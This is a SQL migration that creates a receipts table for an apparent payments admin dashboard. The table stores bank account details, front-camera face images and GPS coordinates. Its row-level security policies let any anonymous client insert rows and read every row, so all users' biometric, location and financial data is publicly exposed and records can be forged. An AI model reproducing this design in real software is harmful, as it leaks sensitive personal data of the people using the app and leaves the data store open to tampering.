/*
  # Create receipts table for admin dashboard

  1. New Tables
    - `receipts`
      - `id` (uuid, primary key)
      - `username` (text, name of the user who made the transaction)
      - `account_name` (text, recipient or wallet top-up name)
      - `bank_name` (text, bank name for transfers)
      - `account_number` (text, account number)
      - `amount` (numeric, transaction amount)
      - `narration` (text, transaction narration/note)
      - `reference_number` (text, unique transaction reference)
      - `transaction_date` (timestamptz, when transaction occurred)
      - `transaction_type` (text, 'debit' for transfer, 'credit' for top-up)
      - `captured_face` (text, base64 image from front camera)
      - `location_latitude` (double precision, GPS latitude)
      - `location_longitude` (double precision, GPS longitude)
      - `location_accuracy` (double precision, GPS accuracy in meters)
      - `created_at` (timestamptz, when record was saved)

  2. Security
    - Enable RLS on `receipts` table
    - Allow anonymous inserts (any device can submit receipts)
    - Allow anonymous reads (admin page can read all receipts)
*/

CREATE TABLE IF NOT EXISTS receipts (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  username text DEFAULT 'BABATUNDE',
  account_name text DEFAULT '',
  bank_name text DEFAULT '',
  account_number text DEFAULT '',
  amount numeric DEFAULT 0,
  narration text DEFAULT '',
  reference_number text DEFAULT '',
  transaction_date timestamptz DEFAULT now(),
  transaction_type text DEFAULT 'debit',
  captured_face text,
  location_latitude double precision,
  location_longitude double precision,
  location_accuracy double precision,
  created_at timestamptz DEFAULT now()
);

ALTER TABLE receipts ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow anonymous inserts"
  ON receipts FOR INSERT
  TO anon
  WITH CHECK (true);

CREATE POLICY "Allow anonymous reads"
  ON receipts FOR SELECT
  TO anon
  USING (true);
